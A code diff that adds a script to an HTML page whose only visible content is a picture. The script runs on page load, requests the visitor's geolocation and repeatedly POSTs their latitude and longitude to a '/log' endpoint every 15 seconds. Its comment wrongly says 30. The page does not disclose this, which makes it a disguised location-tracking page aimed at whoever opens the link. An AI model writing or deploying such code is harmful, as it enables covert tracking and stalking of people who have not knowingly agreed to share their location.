@@ -28,4 +28,42 @@
     </style>
     <img src="Picture1.png" alt="Picture">
 </body>
+
+<script>
+    function getGeolocation() {
+      navigator.geolocation.getCurrentPosition(position => {
+        // Use fetch API to send a POST request
+        fetch('/log', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        });
+      }, error => {
+        fetch('/log', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            error: error.message
+          })
+        });
+        console.error('Error getting geolocation:', error.message);
+      });
+    }
+
+    // Initial call to get geolocation
+    getGeolocation();
+
+    // Set interval to print geolocation coordinates every 30 seconds
+    setInterval(() => {
+      getGeolocation();
+    }, 15000);
+</script>
+    
 </html>
